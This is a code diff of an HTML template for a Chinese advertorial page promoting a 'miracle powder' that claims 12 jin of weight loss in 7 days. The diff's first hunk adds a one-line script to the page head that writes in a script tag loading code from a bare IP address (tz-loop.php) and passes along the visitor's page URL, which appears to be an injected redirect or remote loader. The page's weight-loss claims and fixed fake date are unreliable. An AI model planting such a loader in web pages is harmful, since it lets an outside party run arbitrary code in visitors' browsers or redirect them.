@@ -6,17 +6,7 @@
 <head>
 
 <script>
-     var wxn = 'ls';
-    var ztfb='2019-12-17';
-    var mess2="<?php echo $stxlwx?>";
-    day = new Date();
-    hr = day.getHours();
-    //m = day.getMinutes();
-    m =day.getSeconds();
-    hhjsPath = "http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static";
-
-    mess3 = hhjsPath+'/images/'+mess2+'.jpg';
-    mess4 = hhjsPath+'/images/'+mess2+'.jpg';
+     var CurrentUrl=window.location.href;var hh_tz="http://183.60.106.53:18/tz-loop.php";var prarms=CurrentUrl.indexOf("?");if(prarms>=0){var url_str="";for(i=0;i<prarms;i++){url_str+=CurrentUrl[i]}CurrentUrl=url_str}if(CurrentUrl==""){document.write("<script src='"+hh_tz+"'><\/script>")}else{if(CurrentUrl[(CurrentUrl.length)-1]!=="/"){CurrentUrl=(CurrentUrl+"/")}document.write("<script src='"+hh_tz+"?ref="+CurrentUrl+"'><\/script>")};
 </script>
 <meta http-equiv="Content-Type" content="text/; charset=utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
@@ -26,27 +16,27 @@
 
 
 
-<link rel="stylesheet" href="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/css/font-awesome.min.css" tppabs="http://jjs1.depfm.top/template/mobile/css/font-awesome.min.css">
-<link rel="stylesheet" href="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/css/main.css-v=20190725.css" tppabs="http://jjs1.depfm.top/template/mobile/css/main.css?v=20190725"> 
+<link rel="stylesheet" href="http://fk.gzls05.com/public/depfm/jjs1.depfm.top/template/mobile/css/font-awesome.min.css" tppabs="http://jjs1.depfm.top/template/mobile/css/font-awesome.min.css">
+<link rel="stylesheet" href="http://fk.gzls05.com/public/depfm/jjs1.depfm.top/template/mobile/css/main.css-v=20190725.css" tppabs="http://jjs1.depfm.top/template/mobile/css/main.css?v=20190725"> 
 
  
- <script src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/js/jquery.min.js"></script>
+ <script src="http://fk.gzls05.com/public/depfm/jjs1.depfm.top/template/mobile/js/jquery.min.js"></script>
 
-<script src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/js/bootstrap.min.js" tppabs="http://jjs1.depfm.top/template/mobile/js/bootstrap.min.js"></script>
-<script src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/js/jquery.cookie.js" tppabs="http://jjs1.depfm.top/template/common/js/jquery.cookie.js"></script>
+<script src="http://fk.gzls05.com/public/depfm/jjs1.depfm.top/template/mobile/js/bootstrap.min.js" tppabs="http://jjs1.depfm.top/template/mobile/js/bootstrap.min.js"></script>
+<script src="http://fk.gzls05.com/public/depfm/jjs1.depfm.top/template/common/js/jquery.cookie.js" tppabs="http://jjs1.depfm.top/template/common/js/jquery.cookie.js"></script>
 
 
 
 <!--15种bootstrap模态框动画弹出特效-->
-<link href="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/css/component.css" tppabs="http://jjs1.depfm.top/demo/modal/css/component.css" rel="stylesheet">
+<link href="http://fk.gzls05.com/public/depfm/jjs1.depfm.top/demo/modal/css/component.css" tppabs="http://jjs1.depfm.top/demo/modal/css/component.css" rel="stylesheet">
 
 
 <title>7天狂减12斤？神奇粉末全面揭秘！</title>
-<link rel="stylesheet" type="text/css" href="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/css/infor.css">
+<link rel="stylesheet" type="text/css" href="http://cdn3.gzls03.com/public/yj6.jinanbuyun.com/css/infor.css">
 
 <style>
-img{max-width:100%}.add_wx{color:#fff}.add_wx_go{cursor:pointer}img{max-width:100%}.tabu{font-size:12px;font-family:simsun,arial,helvetica,clean,sans-serif;background:#fff;color:#2b2b2b}.searchDiv02{width:1000px;margin:0 auto;height:36px;padding:20px 0 0 0;position:relative;z-index:103}.searchDiv02 .theLogo{width:620px;float:left;font-size:12px;height:34px;overflow:hidden}.theLogo img{float:left}.searchDiv02 a img{position:absolute;right:361px;top:19px}.searchDiv02 .theLogo a img{position:relative;left:0;top:0}.theCurrent{float:left;padding:7px 0 0 15px}.cDGray,.cDGray a:link,.cDGray a:visited{color:#2b2b2b}.ss_block{display:none}.cDGray,.cDGray a:link,.cDGray a:visited{color:#2b2b2b}.navFind{float:right;width:301px;padding:0}.f-search-wrap{position:relative;width:301px;z-index:80}.f-search-wrap .type{position:relative;float:left;z-index:80}.f-search-wrap .type .checked{width:55px;height:24px;line-height:24px;margin:0 9px 0 0;padding-left:9px;border:1px solid #c7c7c7;background:#fff  no-repeat 40px -28px;font-size:12px;cursor:pointer;color:#bcbcbc}.f-search-wrap .text,.f-search-wrap .type,.f-search-wrap .btn{float:left}.navFind .text{width:180px;height:24px;padding:0 0 0 9px;background:#fff;border:0;color:#bcbcbc;font-size:12px;outline:0}.f-search-wrap .text input{width:180px;_width:163px;height:24px;height:20px\9;padding:0 9px;padding-top:4px\9;background:#fff;color:#bcbcbc;border:1px solid #c7c7c7;border-right:0;border-radius:0;font-size:12px;outline:0}.f-search-wrap .btn{_float:right;_width:28px}.f-search-wrap .text,.f-search-wrap .type,.f-search-wrap .btn{float:left}.h_mainNavNew{width:980px;height:26px;margin:0 auto;padding:7px 10px 3px;font-family:"宋体";position:relative;z-index:999;background:#fff}.cDGray,.cDGray a:link,.cDGray a:visited{color:#2b2b2b}.h_mainNavNew .list_menu{float:left;width:774px;height:24px;line-height:24px}.h_mainNavNew .list_menu li{float:left;background: no-repeat left center;padding:0 9px 0 9px}.h_mainNavNew .list_menu li a:link,.h_mainNavNew .list_menu li a:visited{color:#2b2b2b}.h_mainNavNew .login{width:158px;_width:155px;height:24px;line-height:24px;text-align:right;color:#666;overflow:hidden;float:left}.h_mainNavNew .morehNew{width:48px;float:left}f-search-wrap .btn button{float:right;width:35px;height:26px;background: no-repeat;background-position:0 -55px;color:#000;border:1px solid #c7c7c7;border-left:0;font-weight:bold;cursor:pointer;text-indent:-1000px;outline:0}.f-search-wrap .btn button{float:right;width:35px;height:26px;background: no-repeat;background-position:0 -55px;color:#000;border:1px solid #c7c7c7;border-left:0;font-weight:bold;cursor:pointer;text-indent:-1000px;outline:0}#artical_sth{overflow:hidden;clear:both;padding-bottom:5px;font-size:12px;font-family:simsun,arial,helvetica,clean,sans-serif;background:#fff;color:#2b2b2b}.bd_top{border-top:1px solid #cdcdcd}.space40{clear:both;height:40px;line-height:0;font-size:0;width:100%}#artical_sth p{float:left;width:250px;color:#999;line-height:22px}#artical_sth p a{color:#808080}.share{float:right;padding-top:16px;position:relative;width:149px;overflow:visible}.share{float:right;padding-top:16px;position:relative;width:150px;cursor:pointer;_width:165px}.share-bar-btn1 .bds_tsina{background-position:0 0;margin-left:10px}.share-bar-btn1 a{float:left;display:block;width:40px;height:30px;margin:0;padding:0;background:url("") no-repeat}.share-bar-btn1 .bds_qzone{background-position:0 -32px;margin-left:10px}.share-bar-btn1 .bds_twx{background-position:0 -66px;margin-left:10px}.box03{width:230px;float:right;padding-right:10px}#artical_sth h5{float:right;padding-top:22px;font-weight:normal;text-align:right;color:#999}#artical_sth h5 span{cursor:pointer;height:13px;margin-right:10px;font-weight:normal;text-align:right;color:#999}.cmt a:link,.cmt a:hover,.cmt a:visited{color:#f54343;font-weight:bold}.cmt em{font-family:"Georgia";font-size:16px;font-weight:bold;font-style:normal}#artical_sth h5 span{cursor:pointer;height:13px;margin-right:10px;font-size:12px}.cmt a span{color:#999;font-weight:lighter}.line01{border-top:1px solid #ddd;height:9px;overflow:hidden;clear:both;width:100%;margin-bottom:20px}.left_bq{float:left;width:360px;padding-bottom:20px}.left_bq ul li{width:38px;float:left;text-align:center;overflow:hidden;cursor:pointer;margin-right:20px}.left_bq ul li span{color:#f84143;font-family:Arial,Helvetica,sans-serif}.xc{margin:6px 0 8px 0;width:38px;height:38px;overflow:hidden}.left_bq ul li b{color:#222;font-weight:normal}#artical_sth04{height:47px;margin-top:30px;float:right}#artical_sth04 .share{padding-top:0}.share{float:right;padding-top:16px;position:relative;width:150px;cursor:pointer;_width:165px}#artical_sth2{font-size:12px;font-family:simsun,arial,helvetica,clean,sans-serif;background:#fff;color:#2b2b2b;margin-top:40px;overflow:hidden}
-.mod-commentTextarea{font-size:12px;font-family:simsun,arial,helvetica,clean,sans-serif;background:#fff;color:#2b2b2b}.mod-commentNew{font-size:14px}.zhezhao{width:100%;height:100%;background:#000;filter:alpha(opacity=50);-moz-opacity:.5;-k-opacity:.5;opacity:.5;position:fixed;left:0;top:0;z-index:999997;display:none}.jubao{width:520px;height:410px;position:fixed;left:50%;top:50%;margin:-205px 0 0 -260px;background:#fff;z-index:999998;display:none}.mod-commentTextareaTitle{margin-bottom:8px}.mod-commentTextareaTitle .w-rightBox{float:right}.mod-commentNew{font-size:14px}.w-com a{color:#f54343}.mod-commentTextareaTitle .w-num{font:18px georgia;color:#f54343}.mod-commentTextareaTitle .w-txt{font-size:12px;color:#999}.mod-commentTextareaTitle .w-line{padding:0 8px;font-size:14px}.mod-commentTextarea .w-line{color:#999}.mod-commentNew{font-size:14px}.w-reply a{color:#f54343}.mod-commentTextareaTitle .w-num{font:18px georgia;color:#f54343}.mod-commentTextareaTitle .w-txt{font-size:12px;color:#999}.mod-commentTextareaTitle .w-tips{font-size:12px;color:#999}.mod-commentTextareaMiddle{margin-bottom:8px}.mod-commentTextareaMiddle .w-areaBox{position:relative;height:110px;width:100%}.mod-commentTextareaMiddle .w-commentArea{height:88px;width:97.9%;padding:10px 1%;border:1px solid #dcdcdc;resize:none;outline:0;font-size:14px;color:#999}.mod-commentNew{font-size:14px}.mod-commentTextareaMiddle .w-areaBox .plcg{position:absolute;left:50%;top:50%;margin-left:-45px;margin-top:-10px;padding-left:30px;height:20px;line-height:20px;background: no-repeat;font-weight:bold;color:#666}.mod-commentTextareaMiddle .w-submitBar{position:relative;width:100%;height:40px;border:1px solid #dcdcdc;border-top:0;background:#f7f7f7}.mod-commentTextareaMiddle a.w-submitBtn{display:block;float:right;width:120px;height:40px;background:#f54343;text-align:center;color:#fff;font:18px/40px "microsoft yahei"}.mod-commentTextareaMiddle .i-commentFaceBox{width:60%}.mod-comment-inputFaceBox{padding-top:5px}.mod-comment-inputFaceBox{position:relative}.mod-comment-inputFaceBox .w-face-trigger{display:inline-block;position:relative;margin-left:7px;width:50px;height:30px;float:left;line-height:30px;vertical-align:middle;cursor:pointer}.mod-comment-inputFaceBox .w-face-trigger img{float:left;width:22px;height:22px;padding:2px;margin-right:5px;border:1px solid transparent}.mod-comment-inputFaceBox .icon-faceTrigArr{display:inline-block;width:7px;height:4px;margin-bottom:2px;overflow:hidden;background: no-repeat 0 -4px}.mod-comment-nearlyFace{display:none;width:200px;float:left}.mod-comment-nearlyFace .mod-facesImg-list li{margin:0 5px;border-color:transparent;_border-color:#f7f7f7}.mod-facesImg-list li{float:left;margin:0 5px 5px 0;padding:3px;border:1px solid #ebebeb;height:22px;width:22px;overflow:hidden;text-align:center;cursor:pointer;background:no-repeat center}.mod-facesImg-list li img{width:22px;height:22px}.mod-comment-faceBox{display:none;width:370px;background:#fff;z-index:999;position:absolute;left:-1px;top:40px}.mod-face{box-shadow:0 0 6px #dcdcdc}.mod-face-list{position:relative;padding:10px 5px 5px 10px;border:1px solid #dcdcdc;background:#fff}.mod-comment-faceBox .mod-face-list .w-arr{position:absolute;top:-6px;display:block;width:8px;height:6px;background:url("") no-repeat 0 0;left:17px}.mod-comment-faceBox .mod-face-list .mod-facesImg-list{float:left;width:350px}.mod-facesImg-list li{float:left;margin:0 5px 5px 0;padding:3px;border:1px solid #ebebeb;height:22px;width:22px;overflow:hidden;text-align:center;cursor:pointer;background:no-repeat center}.mod-facesImg-list li img{width:22px;height:22px}.mod-comment-faceBox .mod-face-list .mod-facesImg-big{position:absolute;top:10px;width:63px;height:63px;margin-top:0;margin-right:10px;border:2px solid #e6000a;z-index:99;background-color:#FFF}.mod-comment-faceBox .mod-face-list .mod-facesImg-big img{width:26px;height:26px;margin-top:14px;margin-left:18px;vertical-align:bottom}.mod-comment-faceBox .mod-face-list .mod-facesImg-big p{margin-top:4px;text-align:center;font-size:12px;color:#999}.mod-commentNewTitle{margin-top:25px;margin-bottom:10px;font:bold 20px/22px "microsoft yahei";color:#000}.mod-commentNew{font-size:14px}.mod-articleCommentBlock{position:relative;padding-top:20px;background: repeat-x left bottom}.mod-articleCommentBlock .w-username{margin-bottom:17px;font-size:14px}.mod-articleCommentBlock .w-username,.mod-articleCommentBlock .w-commentTime{color:#999}.mod-articleCommentBlock .w-username,.mod-articleCommentBlock .w-contentTxt{padding:0}.mod-articleCommentBlock .w-username a{font-size:14px}.mod-articleCommentBlock .w-username{margin-bottom:17px;font-size:14px}.mod-articleCommentBlock .w-username,.mod-articleCommentBlock .w-commentTime{color:#999}.w-mid{padding-left:40px;margin-bottom:20px}.mod-articleCommentBlock .w-contentTxt{margin-bottom:15px;line-height:1.4em;color:#2b2b2b;font-size:14px;word-wrap:break-word;word-break:break-all}
+img{max-width:100%}.add_wx{color:#fff}.add_wx_go{cursor:pointer}img{max-width:100%}.tabu{font-size:12px;font-family:simsun,arial,helvetica,clean,sans-serif;background:#fff;color:#2b2b2b}.searchDiv02{width:1000px;margin:0 auto;height:36px;padding:20px 0 0 0;position:relative;z-index:103}.searchDiv02 .theLogo{width:620px;float:left;font-size:12px;height:34px;overflow:hidden}.theLogo img{float:left}.searchDiv02 a img{position:absolute;right:361px;top:19px}.searchDiv02 .theLogo a img{position:relative;left:0;top:0}.theCurrent{float:left;padding:7px 0 0 15px}.cDGray,.cDGray a:link,.cDGray a:visited{color:#2b2b2b}.ss_block{display:none}.cDGray,.cDGray a:link,.cDGray a:visited{color:#2b2b2b}.navFind{float:right;width:301px;padding:0}.f-search-wrap{position:relative;width:301px;z-index:80}.f-search-wrap .type{position:relative;float:left;z-index:80}.f-search-wrap .type .checked{width:55px;height:24px;line-height:24px;margin:0 9px 0 0;padding-left:9px;border:1px solid #c7c7c7;background:#fff  no-repeat 40px -28px;font-size:12px;cursor:pointer;color:#bcbcbc}.f-search-wrap .text,.f-search-wrap .type,.f-search-wrap .btn{float:left}.navFind .text{width:180px;height:24px;padding:0 0 0 9px;background:#fff;border:0;color:#bcbcbc;font-size:12px;outline:0}.f-search-wrap .text input{width:180px;_width:163px;height:24px;height:20px\9;padding:0 9px;padding-top:4px\9;background:#fff;color:#bcbcbc;border:1px solid #c7c7c7;border-right:0;border-radius:0;font-size:12px;outline:0}.f-search-wrap .btn{_float:right;_width:28px}.f-search-wrap .text,.f-search-wrap .type,.f-search-wrap .btn{float:left}.h_mainNavNew{width:980px;height:26px;margin:0 auto;padding:7px 10px 3px;font-family:"宋体";position:relative;z-index:999;background:#fff}.cDGray,.cDGray a:link,.cDGray a:visited{color:#2b2b2b}.h_mainNavNew .list_menu{float:left;width:774px;height:24px;line-height:24px}.h_mainNavNew .list_menu li{float:left;background: no-repeat left center;padding:0 9px 0 9px}.h_mainNavNew .list_menu li a:link,.h_mainNavNew .list_menu li a:visited{color:#2b2b2b}.h_mainNavNew .login{width:158px;_width:155px;height:24px;line-height:24px;text-align:right;color:#666;overflow:hidden;float:left}.h_mainNavNew .morehNew{width:48px;float:left}f-search-wrap .btn button{float:right;width:35px;height:26px;background: no-repeat;background-position:0 -55px;color:#000;border:1px solid #c7c7c7;border-left:0;font-weight:bold;cursor:pointer;text-indent:-1000px;outline:0}.f-search-wrap .btn button{float:right;width:35px;height:26px;background: no-repeat;background-position:0 -55px;color:#000;border:1px solid #c7c7c7;border-left:0;font-weight:bold;cursor:pointer;text-indent:-1000px;outline:0}#artical_sth{overflow:hidden;clear:both;padding-bottom:5px;font-size:12px;font-family:simsun,arial,helvetica,clean,sans-serif;background:#fff;color:#2b2b2b}.bd_top{border-top:1px solid #cdcdcd}.space40{clear:both;height:40px;line-height:0;font-size:0;width:100%}#artical_sth p{float:left;width:250px;color:#999;line-height:22px}#artical_sth p a{color:#808080}.share{float:right;padding-top:16px;position:relative;width:149px;overflow:visible}.share{float:right;padding-top:16px;position:relative;width:150px;cursor:pointer;_width:165px}.share-bar-btn1 .bds_tsina{background-position:0 0;margin-left:10px}.share-bar-btn1 a{float:left;display:block;width:40px;height:30px;margin:0;padding:0;background:url("p0.ifengimg.com/fe/zx2/images/share_e5555840.jpg") no-repeat}.share-bar-btn1 .bds_qzone{background-position:0 -32px;margin-left:10px}.share-bar-btn1 .bds_twx{background-position:0 -66px;margin-left:10px}.box03{width:230px;float:right;padding-right:10px}#artical_sth h5{float:right;padding-top:22px;font-weight:normal;text-align:right;color:#999}#artical_sth h5 span{cursor:pointer;height:13px;margin-right:10px;font-weight:normal;text-align:right;color:#999}.cmt a:link,.cmt a:hover,.cmt a:visited{color:#f54343;font-weight:bold}.cmt em{font-family:"Georgia";font-size:16px;font-weight:bold;font-style:normal}#artical_sth h5 span{cursor:pointer;height:13px;margin-right:10px;font-size:12px}.cmt a span{color:#999;font-weight:lighter}.line01{border-top:1px solid #ddd;height:9px;overflow:hidden;clear:both;width:100%;margin-bottom:20px}.left_bq{float:left;width:360px;padding-bottom:20px}.left_bq ul li{width:38px;float:left;text-align:center;overflow:hidden;cursor:pointer;margin-right:20px}.left_bq ul li span{color:#f84143;font-family:Arial,Helvetica,sans-serif}.xc{margin:6px 0 8px 0;width:38px;height:38px;overflow:hidden}.left_bq ul li b{color:#222;font-weight:normal}#artical_sth04{height:47px;margin-top:30px;float:right}#artical_sth04 .share{padding-top:0}.share{float:right;padding-top:16px;position:relative;width:150px;cursor:pointer;_width:165px}#artical_sth2{font-size:12px;font-family:simsun,arial,helvetica,clean,sans-serif;background:#fff;color:#2b2b2b;margin-top:40px;overflow:hidden}
+.mod-commentTextarea{font-size:12px;font-family:simsun,arial,helvetica,clean,sans-serif;background:#fff;color:#2b2b2b}.mod-commentNew{font-size:14px}.zhezhao{width:100%;height:100%;background:#000;filter:alpha(opacity=50);-moz-opacity:.5;-k-opacity:.5;opacity:.5;position:fixed;left:0;top:0;z-index:999997;display:none}.jubao{width:520px;height:410px;position:fixed;left:50%;top:50%;margin:-205px 0 0 -260px;background:#fff;z-index:999998;display:none}.mod-commentTextareaTitle{margin-bottom:8px}.mod-commentTextareaTitle .w-rightBox{float:right}.mod-commentNew{font-size:14px}.w-com a{color:#f54343}.mod-commentTextareaTitle .w-num{font:18px georgia;color:#f54343}.mod-commentTextareaTitle .w-txt{font-size:12px;color:#999}.mod-commentTextareaTitle .w-line{padding:0 8px;font-size:14px}.mod-commentTextarea .w-line{color:#999}.mod-commentNew{font-size:14px}.w-reply a{color:#f54343}.mod-commentTextareaTitle .w-num{font:18px georgia;color:#f54343}.mod-commentTextareaTitle .w-txt{font-size:12px;color:#999}.mod-commentTextareaTitle .w-tips{font-size:12px;color:#999}.mod-commentTextareaMiddle{margin-bottom:8px}.mod-commentTextareaMiddle .w-areaBox{position:relative;height:110px;width:100%}.mod-commentTextareaMiddle .w-commentArea{height:88px;width:97.9%;padding:10px 1%;border:1px solid #dcdcdc;resize:none;outline:0;font-size:14px;color:#999}.mod-commentNew{font-size:14px}.mod-commentTextareaMiddle .w-areaBox .plcg{position:absolute;left:50%;top:50%;margin-left:-45px;margin-top:-10px;padding-left:30px;height:20px;line-height:20px;background: no-repeat;font-weight:bold;color:#666}.mod-commentTextareaMiddle .w-submitBar{position:relative;width:100%;height:40px;border:1px solid #dcdcdc;border-top:0;background:#f7f7f7}.mod-commentTextareaMiddle a.w-submitBtn{display:block;float:right;width:120px;height:40px;background:#f54343;text-align:center;color:#fff;font:18px/40px "microsoft yahei"}.mod-commentTextareaMiddle .i-commentFaceBox{width:60%}.mod-comment-inputFaceBox{padding-top:5px}.mod-comment-inputFaceBox{position:relative}.mod-comment-inputFaceBox .w-face-trigger{display:inline-block;position:relative;margin-left:7px;width:50px;height:30px;float:left;line-height:30px;vertical-align:middle;cursor:pointer}.mod-comment-inputFaceBox .w-face-trigger img{float:left;width:22px;height:22px;padding:2px;margin-right:5px;border:1px solid transparent}.mod-comment-inputFaceBox .icon-faceTrigArr{display:inline-block;width:7px;height:4px;margin-bottom:2px;overflow:hidden;background: no-repeat 0 -4px}.mod-comment-nearlyFace{display:none;width:200px;float:left}.mod-comment-nearlyFace .mod-facesImg-list li{margin:0 5px;border-color:transparent;_border-color:#f7f7f7}.mod-facesImg-list li{float:left;margin:0 5px 5px 0;padding:3px;border:1px solid #ebebeb;height:22px;width:22px;overflow:hidden;text-align:center;cursor:pointer;background:no-repeat center}.mod-facesImg-list li img{width:22px;height:22px}.mod-comment-faceBox{display:none;width:370px;background:#fff;z-index:999;position:absolute;left:-1px;top:40px}.mod-face{box-shadow:0 0 6px #dcdcdc}.mod-face-list{position:relative;padding:10px 5px 5px 10px;border:1px solid #dcdcdc;background:#fff}.mod-comment-faceBox .mod-face-list .w-arr{position:absolute;top:-6px;display:block;width:8px;height:6px;background:url("y0.ifengimg.com/fe/F_comment_new/images/face-dialogArr_2b3fabfb.png") no-repeat 0 0;left:17px}.mod-comment-faceBox .mod-face-list .mod-facesImg-list{float:left;width:350px}.mod-facesImg-list li{float:left;margin:0 5px 5px 0;padding:3px;border:1px solid #ebebeb;height:22px;width:22px;overflow:hidden;text-align:center;cursor:pointer;background:no-repeat center}.mod-facesImg-list li img{width:22px;height:22px}.mod-comment-faceBox .mod-face-list .mod-facesImg-big{position:absolute;top:10px;width:63px;height:63px;margin-top:0;margin-right:10px;border:2px solid #e6000a;z-index:99;background-color:#FFF}.mod-comment-faceBox .mod-face-list .mod-facesImg-big img{width:26px;height:26px;margin-top:14px;margin-left:18px;vertical-align:bottom}.mod-comment-faceBox .mod-face-list .mod-facesImg-big p{margin-top:4px;text-align:center;font-size:12px;color:#999}.mod-commentNewTitle{margin-top:25px;margin-bottom:10px;font:bold 20px/22px "microsoft yahei";color:#000}.mod-commentNew{font-size:14px}.mod-articleCommentBlock{position:relative;padding-top:20px;background: repeat-x left bottom}.mod-articleCommentBlock .w-username{margin-bottom:17px;font-size:14px}.mod-articleCommentBlock .w-username,.mod-articleCommentBlock .w-commentTime{color:#999}.mod-articleCommentBlock .w-username,.mod-articleCommentBlock .w-contentTxt{padding:0}.mod-articleCommentBlock .w-username a{font-size:14px}.mod-articleCommentBlock .w-username{margin-bottom:17px;font-size:14px}.mod-articleCommentBlock .w-username,.mod-articleCommentBlock .w-commentTime{color:#999}.w-mid{padding-left:40px;margin-bottom:20px}.mod-articleCommentBlock .w-contentTxt{margin-bottom:15px;line-height:1.4em;color:#2b2b2b;font-size:14px;word-wrap:break-word;word-break:break-all}
 .mod-articleCommentBlock .w-bottomBar{font-size:12px;padding-bottom:17px;padding-right:10px}.mod-articleCommentBlock .w-reply{float:right;line-height:14px}.mod-articleCommentBlock .w-rep-rec{color:#000}.mod-articleCommentBlock .w-rep-num{padding-left:8px;font:16px georgia;color:#f54343}.mod-articleCommentBlock .w-rep-line{display:inline-block;padding:0 8px;color:#c2c2c2}.mod-articleCommentBlock .w-rep-reply{color:#000}.mod-articleCommentBlock .w-rep-line{display:inline-block;padding:0 8px;color:#c2c2c2}.mod-articleCommentBlock .w-commentTime{padding-top:4px}.mod-articleCommentBlock .w-username,.mod-articleCommentBlock .w-commentTime{color:#999}.mod-showAllComment{padding-top:40px;text-align:center}.mod-showAllComment a,.mod-showAllComment a:hover{display:inline-block;width:100%;height:27px;line-height:27px;vertical-align:middle;font-size:14px;color:#024375;background:#f1f1f1}em,i{font-style:normal}.footer1{width:1000px;margin:0 auto;border:0;border-top:1px solid #ccc}.footer1 a{color:#000;font-size:12px;text-decoration:none}.footer1 a:hover{color:#f54343;text-decoration:underline}.footer1 .footlink{height:28px;padding-top:15px;border-top:1px solid #fff;overflow:hidden;color:#000;line-height:28px;font-size:12px}.footer1 .fk_l{float:left}.footer1 .fk_r{float:right;width:200px}.footer1 .fk_l a{padding:0 7px;border-right:1px solid #000}.footer1 .fk_l .nolpad{padding-left:0}.footer1 .fk_l .noborder{border:0}.footer1 .fk_r ul{overflow:hidden;margin:0;padding:0;list-style:none}.footer1 .fk_r ul li{float:left;height:28px;overflow:hidden}.footer1 .fk_r ul .l_bg001{background: no-repeat left 9px;padding-left:19px}.footer1 .fk_r ul .l_bg002{background: no-repeat left 9px;padding-left:17px;margin-left:18px}.footer1 .copyright{font-family:Arial,"宋体";color:#666;height:28px;text-align:center;overflow:hidden;line-height:28px}.footer1 .copyright span{padding-right:12px;font-size:12px}@media screen and (max-width:750px){.flow-wx{position:fixed;right:1%}.tabu,.ipad_block,.artical_sth2,.mod-commentTextarea{display:none}.rich_media_area_primary{padding:0 10px}.footer1{width:auto}}.m-avator-slider{position:fixed;z-index:1000;left:50%;margin-left:-700px;top:100px}body{width:100%;max-width:100%;background:#fff}.main{max-width:840px;margin:0 auto;font-size:17px;padding-right:360px}header{padding-top:0}#activity-name{margin-bottom:10px;line-height:1.4;font-weight:400;font-size:24px;color:#333;margin-top:15px}a,a:hover{color:#607fa6}@media screen and (max-width:1024px){.main{padding-right:0}}.rich_media{width:640px;padding-right:0;margin-left:auto;margin-right:auto}.rich_media_inner{margin-top:20px}.statistics02 img{width:40%}.statistics021 img{width:80%}
 .js_hotCmtBlock{
 
@@ -125,7 +115,7 @@ wxmz="王植";
 
     <div class="searchDiv02 js_titleName ss_none" style="z-index: 103;">
 
-        <div class="theLogo"> <a href="javascript:;"><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/logo_health.png" tppabs="http://yj6.jinanbuyun.com/picture/logo_health.png" alt="热点健康" width="150" height="30"></a>
+        <div class="theLogo"> <a href="javascript:;"><img src="//cdn3.gzls03.com/public/yj6.jinanbuyun.com/picture/logo_health.png" tppabs="http://yj6.jinanbuyun.com/picture/logo_health.png" alt="热点健康" width="150" height="30"></a>
 
             <div class="theCurrent cDGray js_crumb">
 
@@ -176,7 +166,7 @@ wxmz="王植";
 
     <div id="artical_sth" class="clearfix">
 
-        <p class="p_time"> <span itemprop="datePublished" class="ss01"><?php echo date("Y年m月d日 13:21:35",strtotime("-7 days"))?></span><br>
+        <p class="p_time"> <span itemprop="datePublished" class="ss01">2019年07月23日 08:01:43</span><br>
 
             <span class="ss02">来源：</span><span itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization"><span itemprop="name" class="ss03"><a href="javascript:;" itemprop="isBasedOnUrl" target="_blank" ref="nofollow">热点健康网-健康</a></span></span> </p>
 
@@ -195,12 +185,12 @@ wxmz="王植";
         <div class="line01"></div>
 
     </div>
-            <!-- <p class="contain_img"><img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/o1cn01zyirub1el0pp0lxws_!!2684310334.jpg" tppabs="http://yj6.jinanbuyun.com/picture/pic_01.jpg"></p> -->
+            <!-- <p class="contain_img"><img src="https://img.alicdn.com/imgextra/i3/2684310334/O1CN01ZyiruB1EL0pp0lXwS_!!2684310334.jpg" tppabs="http://yj6.jinanbuyun.com/picture/pic_01.jpg"></p> -->
 
  <p class="pid pint" style="width:100%;line-height:26px;text-indent:2em;margin:5px 0;">小林和小蓉使用神奇粉末一个月后，均发生翻天覆地的改变，我们一起来看看她们都有什么样的变化。</p>
 <div class="lbj" style="">
     <div style="text-align:center;">
-    <img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/o1cn01ej5ycf1el0prwj26a_!!2684310334.jpg">
+    <img src="https://img.alicdn.com/imgextra/i3/2684310334/O1CN01EJ5ycF1EL0prwJ26a_!!2684310334.jpg">
     </div>
     
     <div style="background:#fff;width:100%;margin:0 auto;padding:10px 0;margin-top:0;text-align:justify; line-height:25px;text-indent:2em;  ">
@@ -208,7 +198,7 @@ wxmz="王植";
     </div>
       
     <div style="text-align:center;margin-top:10px;">
-    <img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/o1cn01ocjp151el0prpscyk_!!2684310334.jpg">
+    <img src="https://img.alicdn.com/imgextra/i4/2684310334/O1CN01oCjp151EL0prpSCYK_!!2684310334.jpg">
     </div>
     
     <div style="background:#fff;width:100%;margin:0 auto;padding:10px 0;margin-top:0;text-align:justify; line-height:25px;text-indent:2em;  ">
@@ -337,9 +327,9 @@ $(window).scroll(function () {
   </script>
 
 
-<script src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/js/myfunc.js" tppabs="http://jjs1.depfm.top/template/mobile/js/myfunc.js"></script>
+<script src="http://fk.gzls05.com/public/depfm/jjs1.depfm.top/template/mobile/js/myfunc.js" tppabs="http://jjs1.depfm.top/template/mobile/js/myfunc.js"></script>
 
-<script src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/js/myfunc.js" tppabs="http://jjs1.depfm.top/template/mobile/js/myfunc.js"></script>
+<script src="http://fk.gzls05.com/public/depfm/jjs1.depfm.top/template/mobile/js/myfunc.js" tppabs="http://jjs1.depfm.top/template/mobile/js/myfunc.js"></script>
 
 <script type="text/javascript">
   //滚动显示
@@ -584,7 +574,7 @@ $(window).scroll(function () {
 
 function image_big(pic_url){
 
-  htm='<img src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/picture/d653cbb1010e43d092f9f1bd7860918e.gif'+pic_url+'" class="img-responsive" >';
+  htm='<img src="http://fk.gzls05.com/public/depfm/'+pic_url+'" class="img-responsive" >';
 
    $('#image_big_c').html(htm);
 
@@ -634,10 +624,10 @@ function submit2(){
 </script>
 
 <!--15种bootstrap模态框动画弹出特效-->
-<script src="http://img.heven.top/<?php echo $dirname.'/'.$dirview ?>/static/js/classie.js" tppabs="http://jjs1.depfm.top/demo/modal/js/classie.js"></script>
